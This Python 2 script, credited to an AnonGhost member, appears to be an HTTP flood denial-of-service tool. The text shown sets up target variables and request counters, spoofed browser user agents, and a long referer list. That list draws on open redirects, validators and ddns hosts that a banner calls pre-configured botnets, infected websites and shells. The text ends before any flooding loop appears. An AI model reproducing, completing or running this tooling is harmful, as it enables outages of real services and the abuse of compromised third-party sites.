import urllib2
import sys
import threading
import random
import re


url=''                                                                                              ###############################
host=''                                                                                             #~~~~Created By Hax Stroke~~~~#
headers_useragents=[]                                                                               #~~~~~~~~~~@FollowMe~~~~~~~~~~#
headers_referers=[]                                                                                 #fb.com/anonghostsoldierstroke#
request_counter=0                                                                                   #~~~youtube.com/c/HaXStroKE~~~#
flag=0                                                                                              #~~~~~Twitter:@HaxStroKE~~~~~~#
safe=0                                                                                              ###############################

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                                       ############################
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Pre-configured            #
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #Botnets                   #
	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by Hax Stroke#
	headers_referers.append('http://www.bing.com/search?q=')                                   #From AnonGhost Team       #
	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
        headers_referers.append('http://validator.w3.org/check?uri=')
        headers_referers.append('http://validator.w3.org/checklink?uri=')
        headers_referers.append('http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
        headers_referers.append('http://validator.w3.org/nu/?doc=')
        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
        headers_referers.append('http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=')
	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://www.ccm.edu/redirect/goto.asp?myURL=')
	headers_referers.append('http://forum.buffed.de/redirect.php?url=')
	headers_referers.append('http://rissa.kommune.no/engine/redirect.php?url=')
	headers_referers.append('http://www.sadsong.net/redirect.php?url=')
	headers_referers.append('https://www.fvsbank.com/redirect.php?url=')
	headers_referers.append('http://www.jerrywho.de/?s=/redirect.php?url=')
	headers_referers.append('http://www.inow.co.nz/redirect.php?url=')
	headers_referers.append('http://www.automation-drive.com/redirect.php?url=')
	headers_referers.append('http://mytinyfile.com/redirect.php?url=')
	headers_referers.append('http://ruforum.mt5.com/redirect.php?url=')
	headers_referers.append('http://www.websiteperformance.info/redirect.php?url=')
	headers_referers.append('http://www.airberlin.com/site/redirect.php?url=')
	headers_referers.append('http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=')
	headers_referers.append('http://evoec.com/review/redirect.php?url=')
	headers_referers.append('http://www.crystalxp.net/redirect.php?url=')
	headers_referers.append('http://watchmovies.cba.pl/articles/includes/redirect.php?url=')
	headers_referers.append('http://www.seowizard.ir/redirect.php?url=')
	headers_referers.append('http://apke.ru/redirect.php?url=')
	headers_referers.append('http://seodrum.com/redirect.php?url=')
	headers_referers.append('http://redrool.com/redirect.php?url=')
	headers_referers.append('http://blog.eduzones.com/redirect.php?url=')
	headers_referers.append('http://www.onlineseoreportcard.com/redirect.php?url=')
	headers_referers.append('http://www.wickedfire.com/redirect.php?url=')
	headers_referers.append('http://searchtoday.info/redirect.php?url=')
	headers_referers.append('http://www.bobsoccer.ru/redirect.php?url=')
	headers_referers.append('http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=')
	headers_referers.append('http://seo.qalebfa.ir/%D8%B3%D8%A6%D9%88%DA%A9%D8%A7%D8%B1/redirect.php?url=')
	headers_referers.append('http://www.firmia.cz/redirect.php?url=')
	headers_referers.append('http://www.e39-forum.de/redir.php?url=')
	headers_referers.append('http://www.wopus.org/wp-content/themes/begin/inc/go.php?url=')
	headers_referers.append('http://www.selectsmart.com/plus/select.php?url=')
	headers_referers.append('http://www.taichinh2a.com/forum/links.php?url=')
	headers_referers.append('http://facenama.com/go.php?url=')
	headers_referers.append('http://www.internet-abc.de/eltern/118732.php?url=')
	headers_referers.append('http://g.makebd.com/index.php?url=')
	headers_referers.append('https://blog.eduzones.com/redirect.php?url=')
	headers_referers.append('http://www.mientay24h.vn/redirector.php?url=')
	headers_referers.append('http://www.kapook.com/webout.php?url=')
	headers_referers.append('http://lue4.ddns.name/pk/index.php?url=')
	headers_referers.append('http://747.ddns.ms/pk/index.php?url=')
	headers_referers.append('http://737.ddns.us/pk/index.php?url=')
	headers_referers.append('http://a30.m1.4irc.com/pk/index.php?url=')

